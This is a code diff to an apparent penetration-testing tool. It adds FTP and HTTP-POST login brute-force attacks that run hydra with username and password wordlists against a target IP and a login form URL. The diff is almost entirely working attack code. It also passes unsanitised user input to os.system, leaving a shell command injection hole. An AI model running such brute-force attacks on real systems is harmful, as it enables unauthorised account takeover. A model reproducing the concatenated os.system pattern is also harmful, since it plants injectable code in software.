@@ -143,6 +143,12 @@ while True:
             if passlist == "":
                 passlist = 'Modules/attack/systemaccess/protocolcracker/simplepass.txt'
 
+
+            if '21' in attackList:
+                print('----------')
+                print('\nStarting FTP bruteforce\n')
+                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ftp://' + targetIP  )
+
             if '22' in attackList:
                 print('----------')
                 print('\nStarting SSH bruteforce\n')
@@ -156,6 +162,24 @@ while True:
                 os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' telnet://' + targetIP  )
                 ## later on add more options, like level of depth of scan, for now this will use basic login creds
                 print('--')
+
+
+            if '80' in attackList:
+                print('There are many possible attacks for webservers; please make a selection for which attack below')
+                http_attack_type = input().lower()
+
+                print ('''
+                    a) HTTP-POST - Webapp login forms
+                            ''')
+            ## -- HTTP POST -- ##
+                if http_attack_type == 'a':
+                    print('----------')
+                    print('For a succesful HTTP-POST attack, hydra must know the location of the login form, please enter the URL of the form below')
+                    loginform = input().lower()
+
+                    print('\nStarting HTTP-POST bruteforce\n')
+                    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' http-post://'  + targetIP + '/' + loginform )
+                    print('--')
 
             if '3389' in attackList:
                 print('--')
